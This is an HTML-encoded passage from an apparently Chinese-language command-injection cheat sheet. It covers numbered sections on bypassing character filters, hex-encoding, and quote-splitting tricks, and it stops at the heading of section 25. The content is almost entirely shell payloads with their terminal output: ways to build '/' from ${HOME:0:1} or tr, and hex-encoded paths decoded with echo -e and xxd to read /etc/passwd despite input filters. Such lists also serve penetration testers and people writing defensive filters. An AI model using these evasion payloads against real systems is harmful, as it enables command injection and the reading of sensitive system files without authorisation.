&lt;h3 id=&#34;22-绕过-characters-filter&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22-绕过-characters-filter&#34;&gt;#&lt;/a&gt; 22. 绕过 Characters Filter&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;swissky@crashlab:~&lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt;&amp;#123;HOME:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;swissky@crashlab:~&lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt;&amp;#123;HOME:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;#125;etc&lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt;&amp;#123;HOME:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;#125;passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root:x:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:root:/root:/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;swissky@crashlab:~&lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; . | tr &lt;span class=&#34;string&#34;&gt;&amp;#x27;!-0&amp;#x27;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;-1&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;swissky@crashlab:~&lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt; tr &lt;span class=&#34;string&#34;&gt;&amp;#x27;!-0&amp;#x27;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;-1&amp;#x27;&lt;/span&gt; &amp;lt;&amp;lt;&amp;lt; .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;swissky@crashlab:~&lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; . | tr &lt;span class=&#34;string&#34;&gt;&amp;#x27;!-0&amp;#x27;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;-1&amp;#x27;&lt;/span&gt;)etc&lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; . | tr &lt;span class=&#34;string&#34;&gt;&amp;#x27;!-0&amp;#x27;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;-1&amp;#x27;&lt;/span&gt;)passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root:x:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:root:/root:/bin/bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;23-绕过-characters-filter-via-hex-encoding&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#23-绕过-characters-filter-via-hex-encoding&#34;&gt;#&lt;/a&gt; 23. 绕过 Characters Filter Via Hex Encoding&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;swissky@crashlab:~&lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;-e&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;swissky@crashlab:~&lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt; `echo &lt;span class=&#34;literal&#34;&gt;-e&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&amp;quot;&lt;/span&gt;`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root:x:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:root:/root:/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;swissky@crashlab:~&lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt; abc=&lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&amp;#x27;&lt;/span&gt;;&lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$abc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root:x:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:root:/root:/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;swissky@crashlab:~&lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt; `echo &lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&amp;#x27;&lt;/span&gt;`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root:x:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:root:/root:/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;swissky@crashlab:~&lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt; xxd &lt;span class=&#34;literal&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;-p&lt;/span&gt; &amp;lt;&amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;f6574632f706173737764&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;swissky@crashlab:~&lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt; `xxd &lt;span class=&#34;literal&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;-p&lt;/span&gt; &amp;lt;&amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;f6574632f706173737764`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root:x:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:root:/root:/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;swissky@crashlab:~&lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt; xxd &lt;span class=&#34;literal&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;-ps&lt;/span&gt; &amp;lt;(&lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;f6574632f706173737764)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;swissky@crashlab:~&lt;span class=&#34;variable&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt; `xxd &lt;span class=&#34;literal&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;-ps&lt;/span&gt; &amp;lt;(&lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;f6574632f706173737764)`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root:x:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:root:/root:/bin/bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;24-绕过-with-single-quote&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#24-绕过-with-single-quote&#34;&gt;#&lt;/a&gt; 24. 绕过 With Single Quote&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;w&lt;span class=&#34;string&#34;&gt;&amp;#x27;h&amp;#x27;&lt;/span&gt;o&lt;span class=&#34;string&#34;&gt;&amp;#x27;am&amp;#x27;&lt;/span&gt;i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wh&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;oami&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;w&amp;#x27;&lt;/span&gt;hoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;25-绕过-with-double-quote&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#25-绕过-with-double-quote&#34;&gt;#&lt;/a&gt; 25. 绕过 With Double Quote&lt;/h3&gt;
